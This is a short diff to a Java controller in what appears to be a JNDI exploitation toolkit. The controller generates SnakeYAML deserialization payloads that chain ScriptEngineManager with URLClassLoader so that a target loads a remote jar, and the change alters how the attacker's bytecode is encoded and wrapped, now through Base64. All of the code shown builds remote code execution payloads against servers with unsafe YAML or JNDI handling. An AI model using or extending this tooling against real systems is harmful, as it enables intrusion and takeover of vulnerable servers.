@@ -14,7 +14,8 @@ import com.h2tg.ysogate.utils.JarUtils;
 import org.apache.naming.ResourceRef;
 import javax.naming.StringRefAddr;
 import com.h2tg.ysogate.utils.CtClassUtils;
-import static com.h2tg.ysogate.controller.bypass.converter.EvalConverter.LoadByJS2;
+import java.util.Base64;
+import static com.h2tg.ysogate.bullet.defineClass.JsConverter.all;
 
 @JNDIController
 @JNDIMapping("/SnakeYaml")
@@ -27,7 +28,7 @@ public class SnakeYamlController extends BasicController {
         String factoryClassName = MiscUtils.getRandStr(12);
         String jarName = MiscUtils.getRandStr(12);
 
-        String code = LoadByJS2(byteCode);
+        String code = all(Base64.getEncoder().encodeToString(byteCode));
 
         String yaml = "!!javax.script.ScriptEngineManager [\n" +
                 "  !!java.net.URLClassLoader [[\n" +
